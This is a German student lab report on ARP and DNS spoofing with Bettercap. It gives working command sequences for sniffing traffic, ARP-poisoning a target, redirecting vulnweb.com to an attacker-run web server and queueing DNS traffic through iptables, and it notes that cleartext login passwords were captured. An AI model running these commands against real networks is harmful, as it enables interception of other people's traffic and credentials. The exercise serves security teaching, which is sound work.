# ITP2I - ARP Spoofing mit Bettercap
---

Author: Markus Truschnegg

Klassse: 4AHITS

Fach: ITP2I

Datum: 24.03.2026

---

# ARP Spoofing

## Übung (Bettercap probe & reco)

installieren:
```
$ sudo apt update
$ sudo apt install Bettercap
```

wenn es ein Problem gibt:
```
$ sudo apt install bettercap --fix-missing
```
help ausführen in Bettercap
```
help
help net.recon
help net.probe
help net.show
```
Unterschied recon und probe:
- recon: passives Sammeln von Netzwerkdaten (ohne aktiv Pakete zu senden)
- probe: aktives Scannen durch Senden von Paketen im Netzwerk

## Übung (bettercap data capture I)

```
net.sniff on
```

Sichtbarer Traffic:
- Lokaler Netzwerktraffic
- HTTP-Anfragen der Geräte im Netzwerk
- DNS Requests
- Datenverkehr von Victim-Geräten
Mann kann sehr gut beobachten wenn am Victim eine Seite geöffnet wird

## Übung (Recherche ARP Spoofing)

ARP-Spoofing ist eine Angriffstechnik in Computernetzwerken bei der ein Angreifer gefälschte Nachrichten des ARP Protokolls in ein lokales Netzwerk sendet. Das Ziel ist es die eigene MAC-Adresse mit der IP-Adresse eines legitimen Geräts im ARP-Cache der Opfer zu verknüpfen

## Übung (bettercap ARP Spoofing)
```
set arp.spoof.targets <Victim IP>
set arp.spoof.fullduplex true
net.probe on
arp.spoof on
```
Beobachtung in Wireshark:
- Verkejhr wird umgeleitet über den Attacker
- MAC Addressen zeigen den Attacker
- ARP replies sind manipuliert

ARP Packete:
 - gefälschte reply packete
 - widerholte Brodcast um arp cache zu manipulieren

## Übung (bettercap data capture)

```
net.sniff on
```
Beobachtung:
- HTTP Daten konnten mitgelesen werden
- Login-Versuche waren sichtbar
- Klartext-Passwörter bei unverschlüsseltem HTTP Traffic

# DNS Spoofing

## Übung (bettercap http Server)

```
$ nano index.html
$ mkdir www
$ mv index.html www/
```

in Bettercap:
```
set http.server.path ./www
```
auf dem Victim dann im Browser:
```
http://<IP von Attacker>
```

## Übung (bettercap DNS Spoofing)

```
set dns.spoof.domains vulnweb.com
set dns.spoof.address <IP vom Attacker>
arp.spoof on
dns.spoof on
```

## Übung (bettercap DNS Spoofing Korrektur)

in der Shell:
```
$ sudo iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 1
```
in Bettercap vor allen anderen DNS befehle:
```
set nfqueue.queue 1
```









